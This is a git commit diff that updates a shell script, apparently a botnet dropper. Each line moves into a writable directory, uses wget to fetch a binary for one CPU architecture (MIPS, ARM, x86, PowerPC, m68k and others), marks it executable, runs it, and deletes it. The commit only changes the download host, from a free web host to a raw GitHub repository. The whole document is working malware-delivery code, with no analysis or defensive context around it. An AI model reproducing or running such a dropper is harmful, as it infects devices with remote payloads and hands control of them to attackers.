21445c24296efae6cba2f72c79590a3e39c854eb
Mastika <167045438+m3Mastika@users.noreply.github.com>
2024-04-28 06:43:52 +0300

    Update qqyt33.sh

--- qqyt33.sh
+++ qqyt33.sh
@@ -1,13 +1,13 @@
 #!/bin/bash
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.mips; chmod +x qqyt33.mips; ./qqyt33.mips; rm -rf qqyt33.mips
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.mpsl; chmod +x qqyt33.mpsl; ./qqyt33.mpsl; rm -rf qqyt33.mpsl
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.sh4; chmod +x qqyt33.sh4; ./qqyt33.sh4; rm -rf qqyt33.sh4
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.x86; chmod +x qqyt33.x86; ./qqyt33.x86; rm -rf qqyt33.x86
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.arm6; chmod +x qqyt33.arm6; ./qqyt33.arm6; rm -rf qqyt33.arm6
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.x32; chmod +x qqyt33.x32; ./qqyt33.x32; rm -rf qqyt33.x32
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.ppc; chmod +x qqyt33.ppc; ./qqyt33.ppc; rm -rf qqyt33.ppc
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.i586; chmod +x qqyt33.i586; ./qqyt33.i586; rm -rf qqyt33.i586
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.m68k; chmod +x qqyt33.m68k; ./qqyt33.m68k; rm -rf qqyt33.m68k
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.ppc; chmod +x qqyt33.ppc; ./qqyt33.ppc; rm -rf qqyt33.ppc
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.arm4; chmod +x qqyt33.arm4; ./qqyt33.arm4; rm -rf qqyt33.arm4
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188882.000webhostapp.com/qqyt33.arm5; chmod +x qqyt33.arm5; ./qqyt33.arm5; rm -rf qqyt33.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.mips; chmod +x qqyt33.mips; ./qqyt33.mips; rm -rf qqyt33.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.mpsl; chmod +x qqyt33.mpsl; ./qqyt33.mpsl; rm -rf qqyt33.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.sh4; chmod +x qqyt33.sh4; ./qqyt33.sh4; rm -rf qqyt33.sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.x86; chmod +x qqyt33.x86; ./qqyt33.x86; rm -rf qqyt33.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.arm6; chmod +x qqyt33.arm6; ./qqyt33.arm6; rm -rf qqyt33.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.x32; chmod +x qqyt33.x32; ./qqyt33.x32; rm -rf qqyt33.x32
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.ppc; chmod +x qqyt33.ppc; ./qqyt33.ppc; rm -rf qqyt33.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.i586; chmod +x qqyt33.i586; ./qqyt33.i586; rm -rf qqyt33.i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.m68k; chmod +x qqyt33.m68k; ./qqyt33.m68k; rm -rf qqyt33.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.ppc; chmod +x qqyt33.ppc; ./qqyt33.ppc; rm -rf qqyt33.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.arm4; chmod +x qqyt33.arm4; ./qqyt33.arm4; rm -rf qqyt33.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/m3Mastika/three/main/qqyt33.arm5; chmod +x qqyt33.arm5; ./qqyt33.arm5; rm -rf qqyt33.arm5
